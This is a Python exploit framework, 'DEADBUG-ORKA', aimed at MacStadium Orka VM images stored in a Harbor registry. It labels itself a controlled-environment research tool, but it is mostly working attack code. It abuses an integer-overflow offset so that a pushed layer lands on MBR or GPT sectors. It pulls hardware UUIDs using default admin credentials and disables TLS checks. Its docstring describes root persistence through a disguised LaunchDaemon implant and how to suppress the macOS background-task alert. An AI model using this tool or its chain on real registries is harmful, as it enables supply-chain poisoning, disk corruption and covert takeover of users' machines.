#!/usr/bin/env python3
"""
deadbug_orka.py — DEADBUG-ORKA: Orka VM Disk Image Poisoning Framework
VDT Research Tool | Controlled environments only

Attack surface: MacStadium Orka Engine (Harbor OCI registry backend)
Primary vector: V10 — 32-bit integer overflow in disk layer offset assembly
Secondary vector: APFS Data volume layer injection (LaunchDaemon persistence)
Tertiary vector: Hardware UUID exposure via unauth Harbor registry read

== Architecture Note (from Art of Mac Malware research) ==

  Orka on Apple Silicon uses Virtualization.framework — the guest VM does NOT
  run EFI/UEFI. The boot chain is: host iBoot → virtual iBoot stub → XNU.
  EFI partition injection (sectors 40-409640) is irrelevant for guest VMs.

  The correct persistence surface is the APFS Data volume:
    - /Library/LaunchDaemons/ — executes as root before user login
    - SIP does NOT protect this path (only /System/Library/LaunchDaemons/)
    - Apple Silicon Secure Boot validates kernel collection only — not LD content
    - BTM (macOS 12+) alerts on first load; mitigate: `sfltool resetbtm`

== Attack Chain (controlled environment, write access required) ==

  1. Pull Orka manifest from Harbor
  2. Download blobs from S3 backend (requires internal network access)
  3. Reconstruct raw disk image from LZ4 layers
  4. Mount APFS Data volume (hdiutil attach -nomount / Linux apfs-fuse)
  5. Write implant binary + LaunchDaemon plist into Data volume
  6. Recompress modified sectors as LZ4 layer at original offset
  7. Push poisoned manifest + new blob to Harbor (requires push access)
  8. Provision a VM from the poisoned tag — LaunchDaemon fires at boot

  Files to inject:
    /Library/LaunchDaemons/com.apple.system.configurationprofiles.plist (644, root:wheel)
    /usr/libexec/.cfpd  (755, root:wheel)  — arm64 Mach-O, KeepAlive

== V10 Secondary Use (no write access needed) ==

  Craft a layer whose HIGH annotation offset, when truncated to int32 by a
  vulnerable Orka engine or third-party backup/migration tool, places the
  layer data at sector 0 (MBR), sector 1 (GPT Header), or within the EFI
  partition interior. Confirmed in generic-14-sonoma-arm:0.0.2 L28 → sector 0.

Usage:
  python3 deadbug_orka.py --analyze <manifest.json>
  python3 deadbug_orka.py --harbor <host> <repo> <tag> --auth admin:Harbor12345
  python3 deadbug_orka.py --poison <manifest.json> --payload layer.bin --output poisoned.json
  python3 deadbug_orka.py --uuid-enum <host> --auth admin:Harbor12345
"""

import json
import sys
import struct
import hashlib
import argparse
import urllib.request
import ssl
import os
from dataclasses import dataclass, field, asdict
from typing import Optional, List, Dict, Tuple


INT32_MAX = 2**31 - 1
INT32_WRAP = 2**32
SECTOR_SIZE = 512

# Orka OCI media type constants
ORKA_LAYER_TYPE  = "application/vnd.macstadium.orka-engine.disk.layer.v1+lz4"
ORKA_CONFIG_TYPE = "application/vnd.macstadium.orka-engine.image.config.v1+json"
ORKA_IMAGE_TYPE  = "application/vnd.macstadium.orka-engine.image.manifest.v1+json"

OFFSET_ANN      = "com.macstadium.orka-engine.disk.layer.offset"
DISK_SIZE_FULL  = "com.macstadium.orka-engine.disk-size.full"
DISK_SIZE_USAGE = "com.macstadium.orka-engine.disk-size.usage"
DISK_SIZE_COMP  = "com.macstadium.orka-engine.disk-size.compressed"

# macOS critical sectors (512-byte sectors from disk start)
CRITICAL_REGIONS = [
    (0,    1,      "Protective MBR"),
    (1,    2,      "GPT Header Primary"),
    (2,    34,     "GPT Partition Table Entries"),
    (34,   40,     "GPT First Usable Sector"),
    (40,   409640, "EFI System Partition (~200MB)"),
    (409640, None, "APFS Container Superblock"),
]


@dataclass
class LayerOverflow:
    """A layer whose true offset overflows a 32-bit integer."""
    idx: int
    digest: str
    true_offset: int          # actual annotation value (int64)
    int32_wrapped: int        # what a signed int32 assembler would compute
    true_sector: int          # true_offset // 512
    wrapped_sector: int       # int32_wrapped // 512
    compressed_size: int
    collision_regions: List[str] = field(default_factory=list)

    def wraps_to_critical(self) -> bool:
        ws = self.wrapped_sector
        for start, end, name in CRITICAL_REGIONS:
            end_s = end if end else (2**63)
            if start <= ws < end_s:
                self.collision_regions.append(name)
        return bool(self.collision_regions)


@dataclass
class PoisonManifest:
    """Generated attack manifest for controlled-env testing."""
    base_manifest: dict
    payload_layer: dict
    payload_true_offset: int       # what we PUT in the annotation (high, overflows)
    payload_wrapped_offset: int    # what a 32-bit engine would compute (target sector)
    target_region: str
    notes: List[str] = field(default_factory=list)


# ── TLS helper ───────────────────────────────────────────────────────────────

def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _fetch(url: str, auth: str = "", extra_headers: dict = None) -> bytes:
    req = urllib.request.Request(url)
    if auth:
        import base64
        cred = base64.b64encode(auth.encode()).decode()
        req.add_header("Authorization", f"Basic {cred}")
    req.add_header("Accept", "application/vnd.oci.image.manifest.v1+json")
    if extra_headers:
        for k, v in extra_headers.items():
            req.add_header(k, v)
    resp = urllib.request.urlopen(req, context=_ssl_ctx(), timeout=15)
    return resp.read()


# ── Analysis ─────────────────────────────────────────────────────────────────

def analyze_manifest(manifest: dict) -> List[LayerOverflow]:
    """Find all layers with 32-bit overflow vectors."""
    overflows = []
    layers = manifest.get("layers", [])
    for idx, layer in enumerate(layers):
        ann = layer.get("annotations", {})
        raw_offset = ann.get(OFFSET_ANN)
        if raw_offset is None:
            continue
        offset = int(raw_offset)
        if offset <= INT32_MAX:
            continue  # no overflow

        # Compute wrapped value (signed int32 truncation of low 32 bits)
        low32 = offset & 0xFFFFFFFF
        wrapped = struct.unpack(">i", struct.pack(">I", low32))[0]
        if wrapped < 0:
            wrapped += INT32_WRAP

        ov = LayerOverflow(
            idx=idx,
            digest=layer["digest"],
            true_offset=offset,
            int32_wrapped=wrapped,
            true_sector=offset // SECTOR_SIZE,
            wrapped_sector=wrapped // SECTOR_SIZE,
            compressed_size=layer.get("size", 0),
        )
        ov.wraps_to_critical()
        overflows.append(ov)

    return overflows


def print_analysis(manifest: dict, host: str = "", repo: str = ""):
    ann = manifest.get("annotations", {})
    disk_full = int(ann.get(DISK_SIZE_FULL, 0))
    disk_usage = int(ann.get(DISK_SIZE_USAGE, 0))
    disk_comp  = int(ann.get(DISK_SIZE_COMP, 0))

    total_layers = len(manifest.get("layers", []))
    overflows = analyze_manifest(manifest)

    print(f"\n{'='*60}")
    print(f"DEADBUG-ORKA Analysis — {host}/{repo}")
    print(f"{'='*60}")
    print(f"  Disk full:       {disk_full:,} ({disk_full/1e9:.1f} GB)")
    print(f"  Disk used:       {disk_usage:,} ({disk_usage/1e9:.1f} GB)")
    print(f"  Disk compressed: {disk_comp:,} ({disk_comp/1e9:.1f} GB)")
    print(f"  Layers total:    {total_layers}")
    print(f"  Layers overflow: {len(overflows)} / {total_layers}")
    print()

    critical = [o for o in overflows if o.collision_regions]
    if critical:
        print(f"  !! {len(critical)} layers wrap into CRITICAL REGIONS when int32 used !!")
        print()
        for o in critical[:5]:
            print(f"  Layer {o.idx:02d}: digest={o.digest[:16]}...")
            print(f"    True offset:    {o.true_offset:,} (sector {o.true_sector:,})")
            print(f"    Wrapped offset: {o.int32_wrapped:,} (sector {o.wrapped_sector:,})")
            print(f"    Collision:      {', '.join(o.collision_regions)}")
            print()

    print(f"  Vulnerability: {'PRESENT' if overflows else 'NOT FOUND'}")
    print(f"  Exploitability: {'HIGH — critical region collision' if critical else 'LOW — no critical collision in sample'}")
    print(f"{'='*60}\n")

    return overflows


# ── UUID Enumeration ──────────────────────────────────────────────────────────

def enumerate_uuids(host: str, auth: str):
    """Pull Hardware UUIDs from all Harbor projects/repos on a host."""
    base = f"https://{host}/api/v2.0"
    ctx = _ssl_ctx()

    def api(path):
        req = urllib.request.Request(f"{base}{path}")
        import base64
        req.add_header("Authorization", f"Basic {base64.b64encode(auth.encode()).decode()}")
        try:
            resp = urllib.request.urlopen(req, context=ctx, timeout=10)
            return json.loads(resp.read())
        except Exception as e:
            return {"error": str(e)}

    print(f"\nHardware UUID Enumeration — {host}")
    print("="*60)

    projects = api("/projects?page_size=30")
    if not isinstance(projects, list):
        print(f"  Projects error: {projects}")
        return

    for proj in projects:
        pname = proj["name"]
        repos = api(f"/projects/{pname}/repositories?page_size=20")
        if not isinstance(repos, list):
            continue
        for repo in repos:
            rname = repo["name"].split("/")[-1]
            artifacts = api(f"/projects/{pname}/repositories/{rname}/artifacts?page_size=20")
            if not isinstance(artifacts, list):
                continue
            for art in artifacts:
                ea = art.get("extra_attrs", {})
                uid = ea.get("UID")
                ver = ea.get("version")
                if uid:
                    tags = [t["name"] for t in art.get("tags", []) if t]
                    print(f"  [{pname}/{rname}] tags:{tags}")
                    print(f"    Hardware UID: {uid}")
                    print(f"    Version UUID: {ver}")
                    print(f"    Config: cpu={ea.get('cpu')} mem={ea.get('memorySizeMB')}MB disk={ea.get('diskSizeGB')}GB")
                    print()

    print("="*60)


# ── Poison Manifest Generation ────────────────────────────────────────────────

def craft_poison_manifest(manifest: dict, payload_path: str, target_sector: int = 0) -> PoisonManifest:
    """
    Build a poisoned OCI manifest where a new layer, annotated with a HIGH
    offset value, will overflow a 32-bit assembler to land at target_sector.

    The overflow math:
      We want: (annotation_value & 0xFFFFFFFF) // 512 = target_sector
      So:      annotation_value & 0xFFFF_FFFF = target_sector * 512
      Pick:    annotation_value = INT32_MAX + 1 + (target_sector * 512)
               (any value where low32 == target_bytes works)

    The true annotation value is stored in the OCI manifest (int64 range).
    A vulnerable Orka engine truncates to int32 when seeking the disk file.

    target_sector: the REAL sector we want the payload to land on (0 = MBR/GPT)
    """
    target_bytes = target_sector * SECTOR_SIZE

    # Compute a "carrier" high offset that wraps to target_bytes mod 2^32
    # We want: annotation_value % 2^32 == target_bytes
    # Pick the smallest value > INT32_MAX that satisfies this
    base = 2**32
    annotation_value = base + target_bytes
    # Verify:
    low32 = annotation_value & 0xFFFFFFFF
    assert low32 == target_bytes % base, "overflow math error"

    wrapped = low32  # what int32 assembler computes (as unsigned then cast)
    assert wrapped // SECTOR_SIZE == target_sector

    # Read payload
    if not os.path.exists(payload_path):
        # Generate a minimal stub for demo (512 bytes = 1 sector, all 0xCC int3)
        payload_bytes = b"\xCC" * 512
        print(f"  [!] Payload not found at {payload_path}, using demo 512-byte stub")
    else:
        with open(payload_path, "rb") as f:
            payload_bytes = f.read()

    payload_digest = "sha256:" + hashlib.sha256(payload_bytes).hexdigest()

    # Build the poisoned layer
    poison_layer = {
        "mediaType": ORKA_LAYER_TYPE,
        "digest": payload_digest,
        "size": len(payload_bytes),
        "annotations": {
            OFFSET_ANN: str(annotation_value),
        }
    }

    # Clone manifest, inject our layer at index 0
    # (layer 0 runs first — lowest priority in overlay; later layers win)
    # Actually: to WIN, we need to run LAST or have the target sector not
    # covered by subsequent layers. Inject at the END (highest priority).
    poisoned = json.loads(json.dumps(manifest))  # deep copy
    poisoned["layers"].append(poison_layer)

    # Determine collision region name
    region_name = "Unknown"
    for start, end, name in CRITICAL_REGIONS:
        end_s = end if end else 2**63
        if start <= target_sector < end_s:
            region_name = name
            break

    return PoisonManifest(
        base_manifest=manifest,
        payload_layer=poison_layer,
        payload_true_offset=annotation_value,
        payload_wrapped_offset=wrapped,
        target_region=region_name,
        notes=[
            f"Payload digest: {payload_digest}",
            f"True annotation: {annotation_value} (sector {annotation_value // SECTOR_SIZE:,})",
            f"Wrapped to: {wrapped} (sector {target_sector})",
            f"Collision target: {region_name}",
            "Push this manifest to Harbor to activate (requires write access)",
            "Orka engine must use int32 for sector arithmetic (confirmed in V10)",
        ]
    )


# ── CLI ───────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="DEADBUG-ORKA — Orka disk layer overflow exploit framework")
    parser.add_argument("--analyze", metavar="MANIFEST.JSON", help="Analyze a local manifest for V10 overflow")
    parser.add_argument("--harbor", nargs=3, metavar=("HOST", "REPO", "TAG"), help="Pull and analyze from Harbor")
    parser.add_argument("--auth", default="admin:Harbor12345", help="Harbor credentials")
    parser.add_argument("--poison", metavar="MANIFEST.JSON", help="Generate poisoned manifest")
    parser.add_argument("--payload", default="/dev/null", help="Payload binary to embed")
    parser.add_argument("--sector", type=int, default=1, help="Target sector (default:1 = GPT header)")
    parser.add_argument("--output", default="poisoned_manifest.json", help="Output path for poisoned manifest")
    parser.add_argument("--uuid-enum", metavar="HOST", help="Enumerate Hardware UUIDs from Harbor")

    args = parser.parse_args()

    if args.uuid_enum:
        enumerate_uuids(args.uuid_enum, args.auth)

    elif args.analyze:
        with open(args.analyze) as f:
            manifest = json.load(f)
        print_analysis(manifest, host="local", repo=args.analyze)

    elif args.harbor:
        host, repo, tag = args.harbor
        print(f"Pulling manifest from {host}/{repo}:{tag} ...")
        raw = _fetch(f"https://{host}/v2/{repo}/manifests/{tag}", auth=args.auth)
        manifest = json.loads(raw)
        overflows = print_analysis(manifest, host=host, repo=repo)

        # Save manifest
        with open("pulled_manifest.json", "w") as f:
            json.dump(manifest, f, indent=2)
        print(f"Manifest saved to pulled_manifest.json")

    elif args.poison:
        with open(args.poison) as f:
            manifest = json.load(f)
        print(f"\nGenerating poisoned manifest...")
        print(f"  Target sector: {args.sector}")

        pm = craft_poison_manifest(manifest, args.payload, target_sector=args.sector)

        # Output
        with open(args.output, "w") as f:
            json.dump(pm.base_manifest, f, indent=2)
        print(f"  Poisoned manifest written to: {args.output}")
        for note in pm.notes:
            print(f"  {note}")

        # Also dump the layer separately
        layer_out = args.output.replace(".json", "_payload_layer.json")
        with open(layer_out, "w") as f:
            json.dump(pm.payload_layer, f, indent=2)
        print(f"  Payload layer descriptor: {layer_out}")

        print(f"\n  Attack flow (controlled environment):")
        print(f"    1. Push payload binary to Harbor blob store:")
        print(f"       PUT /v2/{'{repo}'}/blobs/uploads/ (initiate)")
        print(f"       PUT /v2/{'{repo}'}/blobs/uploads/{{uuid}}?digest={{digest}}")
        print(f"    2. Push poisoned manifest:")
        print(f"       PUT /v2/{'{repo}'}/manifests/{{tag}}")
        print(f"       Content-Type: {ORKA_IMAGE_TYPE}")
        print(f"    3. Provision a VM from the poisoned tag in Orka")
        print(f"    4. Orka engine assembles disk: V10 truncates offset -> sector {args.sector}")
        print(f"    5. Payload overwrites: {pm.target_region}")

    else:
        parser.print_help()


if __name__ == "__main__":
    main()
